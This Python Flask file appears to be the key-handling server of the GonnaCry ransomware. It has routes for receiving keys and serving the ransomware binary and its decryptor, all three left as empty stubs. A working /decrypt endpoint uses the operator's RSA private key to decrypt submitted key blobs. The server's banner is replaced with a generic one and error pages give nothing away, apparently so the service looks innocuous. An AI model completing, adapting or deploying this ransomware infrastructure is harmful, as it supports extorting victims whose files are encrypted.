from flask import Flask, redirect, request, Response
from flask import render_template, url_for
import os
import time
import base64
import json
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

binaries_path = 'binaries/'
gonnacry_binary = 'binaries/gonnacry'
decryptor_binary = 'binaries/decryptor'

#headers = {'Server':'GonnaCry WebServer'}
headers = {'Server':'WebServer'}

with open("private_key.key") as f:
    private_key = f.read()

with open("public_key.key") as f:
    public_key = f.read()

app = Flask("gonnacry-web-server")

@app.errorhandler(404)
def page_not_found(error):
	return Response("nothing to do here ...", status=404, headers=headers)

@app.errorhandler(500)
def internal_error(error):
	return Response("nothing to do here ...", status=404, headers=headers)


@app.route("/recive-keys/", methods=['POST'])
def recive_keys():
    return ''


@app.route("/download-gonnacry/", methods=["GET"])
def download_gonnacry():
    return ''


@app.route("/download-decryptor/", methods=["GET"])
def download_decryptor():
    return ''

def log_request(req):
    """Function to log request information."""
    print(f"Request Method: {req.method}")
    print(f"Request URL: {req.url}")
    print(f"Request Headers: \n{req.headers}")
    if req.form:
        print("Form Data:")
        for key, value in req.form.items():
            print(f"{key}: {value}")
    if req.is_json:
        print("JSON Payload:")
        print(json.dumps(req.get_json(), indent=4))
    if req.data:
        print("Raw Data:")
        print(req.data.decode('utf-8'))

def log_response(res):
    """Function to log response information."""
    print(f"Response Status: {res.status}")
    print(f"Response Headers: \n{res.headers}")
    # Printing the entire body of a response can be inefficient or infeasible for large bodies or binary data.
    # Consider logging specific parts or summaries instead.
    return res

@app.route('/decrypt', methods=['POST'])
def decrypt():
    # Assuming log_request(request) is defined elsewhere
    log_request(request)
    data = request.data.decode('UTF-8')

    if not data:
        return Response("No content.", status=411)

    try:
        enc = json.loads(data)
        enc = json.loads(enc)  # Parse the inner JSON string to get the actual list
    except:
        return Response('Error in the JSON', status=400, headers=headers)

    # Assuming private_key is loaded and formatted correctly
    try:
        key = RSA.importKey(private_key)
        cipher = PKCS1_OAEP.new(key)
        decrypted = ""
        print("enc: {}".format(enc))
        print("type(enc): {}".format(type(enc)))
        for i in enc:
            i = base64.b64decode(i)
            print("i: {}".format(i))
            #i = i.decode('utf-8')
            #print("i: {}".format(i))
            print("type(i): {}".format(type(i)))
            ciphertext = cipher.decrypt(i)
            decrypted +=  ciphertext.decode('utf-8')
   
    except Exception as e:  # Catch all exceptions to diagnose the issue
        err_ = f"Invalid private key or decryption error: {str(e)}"
        print(err_)
        return Response(err_, status=400)

    # Assuming the decrypted data is a string
    return Response(decrypted, status=200)

@app.after_request
def after_request_func(response):
    """Logs details about the response before sending it to the client."""
    log_response(response)
    return response

@app.route("/")
def main():
    return 'nothing to do here ... '

if __name__ == '__main__':

    port = 8000
    host = '0.0.0.0'
    app.run(host=host, port=port, debug= True)
